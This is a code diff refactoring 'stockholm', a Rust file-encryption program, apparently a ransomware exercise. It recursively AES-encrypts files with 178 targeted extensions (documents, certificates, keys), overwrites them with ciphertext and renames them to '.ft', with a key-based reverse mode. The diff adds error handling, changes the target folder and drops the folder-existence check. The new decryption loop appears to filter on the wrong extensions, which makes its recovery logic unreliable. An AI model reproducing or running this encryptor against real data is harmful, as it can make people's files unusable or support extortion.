@@ -1,6 +1,8 @@
 use clap::{Arg, ArgAction, Command};
 use libaes::Cipher;
 use std::{fs, str};
+use std::array::TryFromSliceError;
+use std::fmt;
 use std::process::exit;
 use std::time::{SystemTime, UNIX_EPOCH};
 use sha2::{Sha256, Digest};
@@ -8,7 +10,7 @@ use base64::{Engine as _, engine::general_purpose};
 
 const VERSION: &str = "v1.0";
 const KEY_FILE: &str = "./stockholm.key";
-const TARGET_FOLDER: &str = "~/infection";
+const TARGET_FOLDER: &str = "./my_folder";
 const TARGET_EXTENSIONS: [&str; 178] = [
 	"der",
 	"pfx",
@@ -190,106 +192,172 @@ const TARGET_EXTENSIONS: [&str; 178] = [
 	"doc",
 ];
 
-fn decode_key(key: &String) -> [u8;32] {
-	let key = general_purpose::STANDARD.decode(key).expect("Error: corrupted key");
-	return key[0..32].try_into().unwrap()
+#[derive(Debug)]
+enum StockholmError {
+	ExtractIv(String),
+	ExtractKey(String),
+	ExtractPath(String),
+	WriteFile(String),
+	RenameFile(String),
+	ReadFile(String),
+	ReadDir(String),
+	Utf8DecodeCipheredFile(String),
+	Base64DecodeCipheredFile(String),
 }
 
-fn generate_key() -> [u8;32] {
+impl fmt::Display for StockholmError {
+	fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
+		match self {
+			StockholmError::ExtractIv(details) => write!(f, "unable to extract iv from hash: {}", details),
+			StockholmError::ExtractKey(details) => write!(f, "unable to extract key from hash: {}", details),
+			StockholmError::ExtractPath(details) => write!(f, "unable to extract path: {}", details),
+			StockholmError::WriteFile(details) => write!(f, "unable to write file: {}", details),
+			StockholmError::RenameFile(details) => write!(f, "unable to rename file: {}", details),
+			StockholmError::ReadFile(details) => write!(f, "unable to read file: {}", details),
+			StockholmError::ReadDir(details) => write!(f, "unable to read directory: {}", details),
+			StockholmError::Utf8DecodeCipheredFile(details) => write!(f, "unable to decode file (utf8): {}", details),
+			StockholmError::Base64DecodeCipheredFile(details) => write!(f, "unable to decode file (base64): {}", details),
+		}
+	}
+}
+
+fn decode_key(key: &String) -> Result<[u8;32], StockholmError> {
+	let key = general_purpose::STANDARD.decode(key).expect("Error: corrupted key");
+	key[0..32].try_into().map_err(|err: TryFromSliceError| StockholmError::ExtractKey(err.to_string()))
+}
+
+fn generate_key() -> Result<[u8;32], StockholmError> {
 	let mut hasher256 = Sha256::new();
 	let key = whoami::hostname() +
 		whoami::username().as_str() +
-		SystemTime::now().duration_since(UNIX_EPOCH).unwrap().as_nanos().to_string().as_str();
+		SystemTime::now().duration_since(UNIX_EPOCH).unwrap_or_default().as_nanos().to_string().as_str();
 	hasher256.update(key.as_bytes());
 	let key = format!("{:x}", hasher256.clone().finalize()).into_bytes();
-	let key = key[0..32].try_into().unwrap();
-	return key;
+	key[0..32].try_into().map_err(|err: TryFromSliceError| StockholmError::ExtractKey(err.to_string()))
 }
 
-fn generate_file_iv(key_encoded: &str) -> [u8;16] {
+fn generate_file_iv(key_encoded: &str, file_path: &str) -> Result<[u8;16], StockholmError> {
+	let file_path = file_path.trim_end_matches(".ft");
 	let mut hasher256 = Sha256::new();
-	hasher256.update(format!("{key_encoded}{VERSION}"));
+	hasher256.update(format!("{key_encoded}{file_path}"));
 	let iv = format!("{:x}", hasher256.clone().finalize()).into_bytes();
-	return iv[0..16].try_into().unwrap();
+	iv[0..16].try_into().map_err(|err: TryFromSliceError| StockholmError::ExtractIv(err.to_string()))
 }
 
-fn cipher_file(cipher: &Cipher, key_encoded: &String, file_path: &str, extension: &str) -> [u8;16] {
-	let file_data = fs::read(file_path).expect("Error: unable to read file");
-	let file_iv = generate_file_iv(key_encoded.as_str(), file_path);
+fn cipher_file(cipher: &Cipher, key_encoded: &String, file_path: &str) -> Result<[u8;16], StockholmError> {
+	let file_iv = generate_file_iv(key_encoded.as_str(), file_path)?;
+	let file_data = fs::read(file_path).map_err(|err| StockholmError::ReadFile(err.to_string()))?;
 	let file_ciphered = cipher.cbc_encrypt(&file_iv, file_data.as_slice());
 	let file_encoded = general_purpose::STANDARD.encode(&file_ciphered);
-	fs::write(file_path, file_encoded).expect("Error: unable to write ciphered file");
-	fs::rename(file_path, format!("{file_path}.ft")).unwrap();
-	return file_iv;
+	fs::write(file_path, file_encoded).map_err(|err| StockholmError::WriteFile(err.to_string()))?;
+	fs::rename(file_path, format!("{file_path}.ft")).map_err(|err| StockholmError::RenameFile(err.to_string()))?;
+	Ok(file_iv)
 }
 
-fn cipher_folder(cipher: &Cipher, key_encoded: &String, folder_path: &str, silent: bool) {
-	let paths = fs::read_dir(folder_path).unwrap();
-
-	for path in paths {
-		let path = path.unwrap().path();
-		let extension = path.extension().unwrap().to_str().unwrap();
-		let file_metadata = fs::metadata(path.clone()).expect("Error: unable to get metadata");
-		if file_metadata.is_dir() {
-			cipher_folder(cipher, key_encoded, path.to_str().unwrap(), silent);
-			continue;
-		}
-		if !TARGET_EXTENSIONS.contains(&extension) { continue };
-		let path = path.to_str().unwrap();
-		cipher_file(&cipher, &key_encoded, path, extension);
-		if !silent { println!("{path}"); }
-	}
-}
-
-fn decipher_file(cipher: &Cipher, key_encoded: &String, file_path: &str) -> [u8;16] {
-	let file_iv = generate_file_iv(key_encoded);
-	let file_data = fs::read(file_path).expect("Error: unable to read file");
-	let file_data = general_purpose::STANDARD.decode(&file_data).expect("Error: unable to decode file");
+fn decipher_file(cipher: &Cipher, key_encoded: &String, file_path: &str) -> Result<[u8;16], StockholmError> {
+	let file_iv = generate_file_iv(key_encoded, file_path)?;
+	let file_data = fs::read(file_path).map_err(|err| StockholmError::ReadFile(err.to_string()))?;
+	let file_data = general_purpose::STANDARD.decode(&file_data).map_err(|err| StockholmError::Base64DecodeCipheredFile(err.to_string()))?;
 	let file_data = cipher.cbc_decrypt(file_iv.as_slice(), &file_data);
-	let file_data = String::from_utf8(file_data);
-	if let Err(err) = file_data {
-		eprintln!("Error: unable to serialize file: {err}");
-		return file_iv;
-	}
-	let file_data = file_data.unwrap();
-	let new_file_name = file_path.strip_suffix(".ft").expect("Error: unable to remove extension from file");
-	fs::write(file_path, file_data).expect("Error: unable to write deciphered file");
-	fs::rename(file_path, new_file_name).expect("Error: unable to rename file");
-	return file_iv;
+	let file_data = String::from_utf8(file_data).map_err(|err| StockholmError::Utf8DecodeCipheredFile(err.to_string()))?;
+	let new_file_name = file_path.trim_end_matches(".ft");
+	fs::write(file_path, file_data).map_err(|err| StockholmError::WriteFile(err.to_string()))?;
+	fs::rename(file_path, new_file_name).map_err(|err| StockholmError::RenameFile(err.to_string()))?;
+	Ok(file_iv)
 }
 
-fn decipher_folder(cipher: &Cipher, key_encoded: &String, folder_path: &str, silent: bool) {
-	let paths = fs::read_dir(folder_path).unwrap();
+fn cipher_folder(cipher: &Cipher, key_encoded: &String, folder_path: &str, silent: bool) -> Result<(), StockholmError> {
+	let paths = fs::read_dir(folder_path).map_err(|err| StockholmError::ReadDir(err.to_string()))?;
 
 	for path in paths {
-		let path = path.unwrap().path();
-		let file_metadata = fs::metadata(path.clone()).expect("Error: unable to get metadata");
-		if file_metadata.is_dir() {
-			decipher_folder(cipher, key_encoded, path.to_str().unwrap(), silent);
+		if let Err(err) = path {
+			eprintln!("Error: an error occurred while reading files in '{folder_path}': {}", StockholmError::ExtractPath(err.to_string()));
 			continue;
 		}
-		let extension = path.extension().unwrap().to_str().unwrap();
-		if extension != "ft" { continue };
-		let path = path.to_str().unwrap();
-
-		decipher_file(cipher, key_encoded, path);
-		if !silent { println!("{path}"); }
+		let path = path.unwrap().path();
+		let path_string = path.to_string_lossy().to_string();
+		let file_metadata = fs::metadata(path.clone());
+		if let Err(err) = file_metadata {
+			eprintln!("Error: can't extract metadata from '{path_string}': {err}");
+			continue;
+		}
+		if file_metadata.unwrap().is_dir() {
+			if let Err(err) = cipher_folder(cipher, key_encoded, path.to_str().unwrap(), silent) {
+				eprintln!("Error: can't read dir '{folder_path}': {err}");
+			}
+			continue;
+		}
+		let extension = path.extension().unwrap_or_default().to_str().unwrap_or_default();
+		if !TARGET_EXTENSIONS.contains(&extension) { continue };
+		if let Err(err) = cipher_file(&cipher, &key_encoded, path_string.as_str()) {
+			eprintln!("Error: can't cipher '{path_string}': {err}", );
+			continue;
+		}
+		if !silent { println!("Ciphered: '{path_string}'"); }
 	}
+
+	Ok(())
+}
+
+fn decipher_folder(cipher: &Cipher, key_encoded: &String, folder_path: &str, silent: bool) -> Result<(), StockholmError> {
+	let paths = fs::read_dir(folder_path).map_err(|err| StockholmError::ReadDir(err.to_string()))?;
+
+	for path in paths {
+		if let Err(err) = path {
+			eprintln!("Error: an error occurred while reading files in '{folder_path}': {}", StockholmError::ExtractPath(err.to_string()));
+			continue;
+		}
+		let path = path.unwrap().path();
+		let path_string = path.to_string_lossy().to_string();
+		let file_metadata = fs::metadata(path.clone());
+		if let Err(err) = file_metadata {
+			eprintln!("Error: can't extract metadata from '{path_string}': {err}");
+			continue;
+		}
+		if file_metadata.unwrap().is_dir() {
+			if let Err(err) = decipher_folder(cipher, key_encoded, path.to_str().unwrap(), silent) {
+				eprintln!("Error: can't read dir '{folder_path}': {err}");
+			}
+			continue;
+		}
+		let extension = path.extension().unwrap_or_default().to_str().unwrap_or_default();
+		if !TARGET_EXTENSIONS.contains(&extension) { continue };
+		if let Err(err) = decipher_file(&cipher, &key_encoded, path_string.as_str()) {
+			eprintln!("Error: can't decipher '{path_string}': {err}", );
+			continue;
+		}
+		if !silent { println!("Deciphered: '{path_string}'"); }
+	}
+
+	Ok(())
 }
 
 fn cipher_command(silent: bool) {
 	let key = generate_key();
+	if let Err(err) = key {
+		eprintln!("An error occurred while generating key: {err}");
+		return;
+	}
+	let key = key.unwrap();
 	let key_encoded = general_purpose::STANDARD.encode(&key);
-	fs::write(KEY_FILE, key_encoded.clone()).expect("Error: unable to create key file");
+	if let Err(err) = fs::write(KEY_FILE, key_encoded.clone()) {
+		eprintln!("An error occurred while writing key: {err}");
+		return;
+	}
 
 	let cipher = Cipher::new_256(&key);
-	cipher_folder(&cipher, &key_encoded, TARGET_FOLDER, silent)
+	let _ = cipher_folder(&cipher, &key_encoded, TARGET_FOLDER, silent);
 }
 
 fn decipher_command(key_encoded: &String, silent: bool) {
 	let key = decode_key(key_encoded);
+	if let Err(err) = key {
+		eprintln!("An error occurred while decoding key: {err}");
+		return;
+	}
+	let key = key.unwrap();
 	let cipher = Cipher::new_256(&key);
-	decipher_folder(&cipher, key_encoded, TARGET_FOLDER, silent);
+	let _ = decipher_folder(&cipher, &key_encoded, TARGET_FOLDER, silent);
 }
 
 fn main() {
@@ -316,11 +384,6 @@ fn main() {
 
 	if matches.get_flag("version") {
 		println!("stockholm {VERSION}");
-	}
-
-	if let Err(err) = fs::metadata(TARGET_FOLDER) {
-		eprintln!("Error: could not open target folder '{TARGET_FOLDER}': {err}");
-		exit(1);
 	}
 
 	if let Some(key) = matches.get_one::<String>("reverse") {
